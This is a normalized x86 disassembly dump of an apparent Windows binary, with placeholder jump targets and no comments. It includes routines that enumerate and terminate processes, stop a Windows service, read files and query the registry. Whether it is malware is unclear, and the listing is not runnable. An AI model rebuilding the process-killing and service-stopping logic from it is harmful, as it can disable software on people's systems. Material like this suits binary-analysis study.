call [ GetSystemInfo@IAT ]
lea ecx [ ebp - 0x28 ]
push ecx
call eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp - 0x28 ] 0x6
je r-xdata
cmp [ ebp - 0x28 ] 0x9
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40eb9e
leave
retn
sub_40dc07
push 0xffffffff
push sub_41e436
mov eax [ fs : 0x0 ]
push eax
sub esp 0x134
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x130 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x148 ]
mov [ fs : 0x0 ] eax
mov esi edx
mov edi ecx
xor ebx ebx
push 0x103
lea eax [ esp + 0x41 ]
push ebx
mov [ esp + 0x20 ] ebx
push eax
mov [ esp + 0x28 ] edi
mov [ esp + 0x48 ] bl
call sub_414c70
add esp 0xc
mov ecx edi
call sub_402150
xor ebp ebp
mov [ esp + 0x150 ] ebx
inc ebp
mov ecx esi
mov [ esp + 0x18 ] ebp
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov eax edi
mov ecx [ esp + 0x148 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x130 ]
xor ecx esp
call sub_40eb9e
add esp 0x140
retn
push ebx
push 0x80
push 0x3
push ebx
push ebp
push 0x80000000
mov ecx esi
call j_sub_402624
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push ebx
lea eax [ esp + 0x3c ]
push eax
push 0x104
lea eax [ esp + 0x48 ]
push eax
push esi
mov [ esp + 0x4c ] ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x3c ]
call sub_40a2f9
mov ebx eax
mov ecx ebx
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
mov edx ebx
lea ecx [ esp + 0x24 ]
call sub_40e3aa
pop ecx
mov ecx eax
mov [ esp + 0x150 ] ebp
call j_sub_402624
push eax
mov ecx edi
call j_sub_402504
lea ecx [ esp + 0x20 ]
call sub_40223f
push ebx
call j_sub_40f402
pop ecx
sub_40ddf9
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40df67
mov eax [ ebp + 0x8 ]
leave
retn 0xc
sub_40de40
push esi
push edi
mov esi ecx
mov edi r--data
mov ecx edi
call sub_401014
push eax
push edi
push 0x2
push ecx
mov ecx esi
call sub_403212
pop edi
pop esi
retn 0xc
sub_40de6e
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
push edi
call sub_402385
mov edi eax
push edi
mov ecx esi
call sub_40dffa
test al al
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
sub edi [ esi ]
push ebx
mov eax edi
push 0x18
cdq
pop ebx
idiv ebx
mov ecx [ esi + 0x4 ]
mov edi eax
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov ecx [ esp + 0xc ]
call sub_402385
push eax
push [ esi + 0x4 ]
call sub_40e273
add [ esi + 0x4 ] 0x18
push ecx
mov ecx esi
call sub_40e011
imul edi edi 0x18
add edi [ esi ]
mov ecx edi
call sub_402385
push eax
push [ esi + 0x4 ]
call sub_40e273
add [ esi + 0x4 ] ebx
pop ebx
jmp r-xdata
push ecx
mov ecx esi
call sub_40e011
pop edi
pop esi
retn 0x4
sub_40df30
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
push ecx
mov ecx esi
call j_sub_40b224
mov edx [ edi ]
mov ecx edi
mov [ esi ] edx
call sub_40df24
pop edi
mov eax esi
pop esi
retn 0x8
sub_40df67
push esi
push ecx
mov esi ecx
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_4025d7
push [ esp + 0x10 ]
mov ecx esi
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40247e
mov eax esi
pop esi
retn 0x10
sub_40df94
push ebx
push esi
push edi
mov edi ecx
or ebx 0xffffffff
mov esi [ edi + 0x10 ]
cmp esi 0x1
jb r-xdata
mov eax ebx
dec esi
cmp esi ebx
cmova esi ebx
call sub_402624
lea esi [ eax + esi * 2 ]
mov ecx edi
call sub_402624
cmp esi eax
je r-xdata
mov edx [ esp + 0x10 ]
push 0x1
mov ecx esi
call sub_401005
pop ecx
test eax eax
je r-xdata
sub esi 0x2
jmp r-xdata
mov ecx edi
call sub_402624
sub esi eax
sar esi 0x1
mov eax esi
jmp r-xdata
mov edx [ esp + 0x10 ]
mov ecx esi
call sub_40b49c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn 0xc
sub_40e011
push edi
mov edi ecx
call sub_40e096
cmp eax 0x1
jae r-xdata
pop edi
retn 0x4
push esi
mov ecx edi
call sub_40e0a3
mov esi eax
call j_sub_40e189
sub eax esi
pop esi
cmp eax 0x1
jb r-xdata
call sub_40e14a
mov ecx edi
call sub_40e0a3
inc eax
push eax
mov ecx edi
call sub_40e0c6
push eax
mov ecx edi
call sub_40e0f4
sub_40e057
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
push [ esi ]
call sub_40e0b4
push ecx
push [ esi ]
call j_sub_402aa9
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
sub_40e0c6
push esi
push edi
call sub_40e162
mov esi eax
mov edi esi
shr edi 0x1
call j_sub_40e189
sub eax edi
cmp eax esi
jae r-xdata
add esi edi
xor esi esi
jmp r-xdata
cmp esi [ esp + 0xc ]
pop edi
cmovb esi [ esp + 0x8 ]
mov eax esi
pop esi
retn 0x4
sub_40e0f4
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov esi ecx
call j_sub_40e178
mov ebp eax
push ebp
push [ esi + 0x4 ]
push [ esi ]
call sub_40e2a5
mov ecx esi
call sub_40e0a3
cmp [ esi ] 0x0
mov ebx eax
je r-xdata
imul edi edi 0x18
imul ebx ebx 0x18
add edi ebp
add ebx ebp
mov [ esi + 0x8 ] edi
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi ] ebp
pop esi
pop ebp
pop ebx
retn 0x4
push [ esi + 0x4 ]
push [ esi ]
call sub_40e0b4
push ecx
push [ esi ]
call j_sub_402aa9
sub_40e18f
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov ecx edx
call sub_4023f3
mov ecx eax
call sub_402385
push eax
mov ecx esi
call sub_4021b8
mov eax esi
pop esi
leave
retn
sub_40e1b8
push 0x8
mov eax sub_41daf3
call sub_411378
mov edi edx
mov ebx ecx
mov [ ebp - 0x14 ] ebx
and [ ebp - 0x10 ] 0x0
call sub_402150
and [ ebp - 0x4 ] 0x0
mov ecx edi
mov [ ebp - 0x10 ] 0x1
call sub_401014
mov ecx [ ebp + 0x8 ]
mov esi eax
call sub_40228d
add esi eax
push esi
mov ecx ebx
call sub_402ffb
push edi
mov ecx ebx
call j_sub_402403
push [ ebp + 0x8 ]
mov ecx ebx
call j_sub_4023f3
mov eax ebx
call sub_411346
retn
sub_40e214
push 0x8
mov eax sub_41daf3
call sub_411378
mov edi ecx
mov [ ebp - 0x14 ] edi
and [ ebp - 0x10 ] 0x0
call sub_402150
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x1
call sub_40228d
mov ebx rw-data
mov ecx ebx
mov esi eax
call sub_40228d
add esi eax
push esi
mov ecx edi
call sub_402ffb
push ebx
mov ecx edi
call j_sub_4023f3
push [ ebp + 0x8 ]
mov ecx edi
call j_sub_4023f3
mov eax edi
call sub_411346
retn
sub_40e28a
push esi
push edi
mov esi edx
mov edi ecx
call sub_40e2f3
mov edx esi
push eax
push ecx
mov ecx edi
call sub_40e2fa
pop ecx
pop ecx
pop edi
pop esi
retn
sub_40e2bc
xor eax eax
test ecx ecx
je r-xdata
retn
cmp ecx 0xaaaaaaa
ja r-xdata
jmp sub_40eb08
imul ecx ecx 0x18
push ecx
call sub_40f24f
pop ecx
test eax eax
jne r-xdata
sub_40e2fa
push esi
push edi
mov edi edx
mov esi ecx
jmp r-xdata
cmp esi edi
jne r-xdata
push esi
call sub_40e35c
add esi 0x18
pop edi
pop esi
retn
sub_40e312
push esi
push edi
mov esi edx
mov edi ecx
call sub_40e2f3
mov edx esi
push eax
push ecx
push ecx
push [ esp + 0x18 ]
mov ecx edi
call sub_40e368
add esp 0x10
pop edi
pop esi
retn
sub_40e333
push esi
push [ esp + 0x8 ]
push 0x18
call sub_401000
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
retn 0x8
mov ecx [ esp + 0xc ]
call sub_402385
push eax
mov ecx esi
call sub_4021b8
sub_40e368
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov ebx edx
mov edi ecx
pop edi
mov eax esi
pop esi
pop ebx
retn
push edi
push esi
call sub_40e273
add esi 0x18
add edi 0x18
jmp r-xdata
cmp edi ebx
je r-xdata
sub_40e3aa
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
push ebx
push ebp
push esi
push edi
xor eax eax
push eax
push eax
push [ esp + 0x3c ]
mov esi edx
push esi
push eax
push eax
mov ebx ecx
mov [ esp + 0x28 ] eax
call [ MultiByteToWideChar@IAT ]
mov edi eax
test edi edi
jg r-xdata
xor ecx ecx
push 0x2
pop edx
lea eax [ edi + 0x1 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40eb95
mov ebp eax
pop ecx
test ebp ebp
je r-xdata
push r--data
mov ecx ebx
call sub_402193
jmp r-xdata
push edi
push ebp
push [ esp + 0x3c ]
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
xor eax eax
mov [ ebp + edi * 2 ] ax
mov eax 0xfeff
cmp [ ebp ] ax
jne r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x20
retn
push ebp
lea ecx [ esp + 0x18 ]
call sub_402193
push ebp
call j_sub_40f402
pop ecx
lea eax [ esp + 0x14 ]
push eax
mov ecx ebx
call sub_4021b8
lea ecx [ esp + 0x14 ]
call sub_40223f
test edi edi
jle r-xdata
mov ecx edi
lea esi [ ebp + 0x2 ]
mov edi ebp
[ edi ] [ esi ]
sub_40e473
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x4 ]
push ebx
push esi
push edi
push eax
mov ebx ecx
call sub_402520
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
call sub_402537
mov esi eax
lea eax [ ebp - 0xc ]
push eax
mov ecx ebx
call sub_402520
push [ edi ]
lea ecx [ ebp - 0x10 ]
push [ esi ]
push [ eax ]
call sub_40e66d
add esp 0xc
mov eax ebx
pop edi
pop esi
pop ebx
leave
retn
sub_40e4b9
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
push ecx
push ecx
mov esi ecx
call sub_40e592
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ecx
push ecx
mov ecx esi
call sub_40e5ac
mov ecx esi
cmp eax 0xffffffff
je r-xdata
push r--data
mov ecx esi
call j_sub_402504
jmp r-xdata
push 0xffffffff
sub eax edi
inc eax
push eax
jmp r-xdata
pop edi
pop esi
leave
retn
push edi
lea eax [ ebp - 0x18 ]
push eax
call sub_40ddf9
push eax
mov ecx esi
call sub_4021e3
lea ecx [ ebp - 0x18 ]
call sub_40223f
sub_40e515
push ecx
push ecx
push ebp
push esi
push edi
xor eax eax
push eax
push eax
push 0xffffffff
mov ebp edx
push ebp
push eax
push 0xfde9
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] eax
call [ MultiByteToWideChar@IAT ]
mov edi eax
xor ecx ecx
push 0x2
pop edx
lea eax [ edi + 0x1 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40eb95
lea ecx [ edi * 2 + 0x2 ]
push ecx
mov esi eax
push 0x0
push esi
call sub_414c70
add esp 0x10
push edi
push esi
push 0xffffffff
push ebp
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov ecx [ esp + 0xc ]
push esi
call sub_402193
push esi
call j_sub_40f402
mov eax [ esp + 0x10 ]
pop ecx
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn
sub_40e5c6
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0x10 ]
test esi esi
je r-xdata
or eax 0xffffffff
call sub_402624
mov ecx edi
lea ebx [ eax + esi * 2 ]
call sub_402624
mov esi eax
jmp r-xdata
cmp esi ebx
jb r-xdata
mov ecx [ esp + 0x10 ]
xor edx edx
push esi
inc edx
call sub_40104a
pop ecx
test eax eax
je r-xdata
mov ecx edi
call sub_402624
sub esi eax
sar esi 0x1
mov eax esi
jmp r-xdata
add esi 0x2
pop edi
pop esi
pop ebx
retn 0xc
sub_40e616
push esi
push edi
mov edi ecx
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
or eax 0xffffffff
cmp eax 0xffffffff
jbe r-xdata
lea esi [ eax - 0x1 ]
or esi 0xffffffff
jmp r-xdata
mov ecx [ esp + 0xc ]
xor edx edx
push esi
inc edx
call sub_40104a
pop ecx
mov ecx edi
test eax eax
jne r-xdata
call sub_402624
lea esi [ eax + esi * 2 ]
jmp r-xdata
call sub_402624
cmp esi eax
je r-xdata
call sub_402624
sub esi eax
sar esi 0x1
mov eax esi
jmp r-xdata
sub esi 0x2
pop edi
pop esi
retn 0xc
sub_40e66d
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
mov esi ecx
push eax
lea ecx [ ebp + 0x8 ]
call sub_40df52
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ esi ] eax
push sub_41069d
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40e6b6
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40e6b6
pop ecx
mov edx eax
mov ecx esi
call sub_40e6bf
add esp 0xc
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_40e6bf
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push edi
mov edi edx
mov ebx ecx
cmp edi [ esp + 0x10 ]
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
pop ebp
mov [ ebx ] ecx
mov eax ebx
pop ebx
retn
push esi
movzx eax [ edi ]
push eax
call ebp
pop ecx
lea ecx [ esp + 0x18 ]
mov esi eax
call j_sub_40111a
lea ecx [ esp + 0x18 ]
mov [ eax ] si
add edi 0x2
call sub_40e705
cmp edi [ esp + 0x14 ]
jne r-xdata
pop esi
sub_40e717
sub esp 0x230
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x22c ] eax
push ebx
push esi
push edi
xor esi esi
push esi
push 0x2
mov ebx ecx
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0x238 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x230
retn
push ebp
push ebx
call [ PathFindFileNameW@IAT ]
mov ebp 0x22c
push ebp
mov ebx eax
lea eax [ esp + 0x14 ]
push esi
push eax
call sub_414c70
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
push edi
mov [ esp + 0x18 ] ebp
call [ Process32FirstW@IAT ]
pop ebp
mov esi [ esp + 0x14 ]
lea eax [ esp + 0xc ]
push eax
push edi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x30 ]
push ebx
push eax
call sub_4103f0
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax esi
sub_40e7b8
push ebx
push esi
push edi
mov ebx ecx
call sub_40e717
xor edi edi
pop edi
pop esi
pop ebx
retn
push eax
push 0x0
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x64
call [ Sleep@IAT ]
mov ecx ebx
call sub_40e717
inc edi
cmp edi 0x14
jl r-xdata
push 0x0
push esi
call [ TerminateProcess@IAT ]
push esi
call [ CloseHandle@IAT ]
test eax eax
je r-xdata
sub_40e807
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov al 0x1
pop edi
call sub_40eb9e
leave
retn
push esi
push 0xf01ff
push r--data
push edi
call [ OpenServiceW@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
pop esi
lea eax [ ebp - 0x20 ]
push eax
push esi
call [ QueryServiceStatus@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseServiceHandle@IAT ]
cmp [ ebp - 0x1c ] 0x4
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x1
push esi
call [ ControlService@IAT ]
sub_40e8ab
push esi
mov esi ecx
call sub_40e891
push esi
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov al 0x1
and [ esi ] 0x0
xor al al
jmp r-xdata
pop esi
retn 0xc
sub_40e8d9
cmp [ ecx ] 0x0
jne r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x14 ]
push [ ecx ]
call [ RegQueryValueExW@IAT ]
neg eax
sbb eax eax
inc eax
xor al al
jmp r-xdata
retn 0x10
sub_40e904
push ebp
lea ebp [ esp - 0xf8c ]
mov eax 0x100c
call sub_413dc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xf88 ] eax
mov eax [ ebp + 0xf94 ]
push esi
mov esi [ ebp + 0xf98 ]
push edi
lea edx [ ebp - 0x7c ]
push edx
lea edx [ ebp - 0x80 ]
push edx
lea edx [ ebp + 0x788 ]
push edx
push eax
mov [ ebp - 0x7c ] 0x1
mov [ ebp - 0x80 ] 0x800
call sub_40e8d9
test al al
je r-xdata
xor al al
cmp [ ebp - 0x7c ] 0x1
jne r-xdata
cmp [ ebp - 0x7c ] 0x2
jne r-xdata
lea eax [ ebp + 0x788 ]
push eax
jmp r-xdata
mov edi 0x400
push edi
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp + 0x788 ]
push eax
call [ ExpandEnvironmentStringsW@IAT ]
mov [ ebp - 0x80 ] eax
test eax eax
je r-xdata
mov ecx esi
call j_sub_402504
mov al 0x1
jmp r-xdata
cmp eax edi
ja r-xdata
mov ecx [ ebp + 0xf88 ]
pop edi
xor ecx ebp
pop esi
call sub_40eb9e
add ebp 0xf8c
leave
retn 0x8
lea ecx [ ebp - 0x78 ]
push ecx
sub_40e9d6
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor al al
pop esi
retn
push [ esi + 0x4 ]
call [ CloseHandle@IAT ]
and [ esi + 0x4 ] 0x0
mov al 0x1
pop esi
retn
sub_40e9f4
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_40ea1e
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_40eac4
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41029e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
sub_40eae9
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41029e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
sub_40eb08
push ebp
mov ebp esp
sub esp 0x10
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_410260
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_4112eb
int3
sub_40eb39
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_41023b
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_4112eb
int3
sub_40eb67
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_41023b
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_4112eb
int3
sub_40ebc0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_40f094 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40ef98 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40f094 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40ee0c ]
jmp [ ecx * 4 + jump_table_40ee8c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40eef8 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40f094 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40eef8 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40f094 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40f094 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40f094 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40eef8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40eef8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40eef8 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
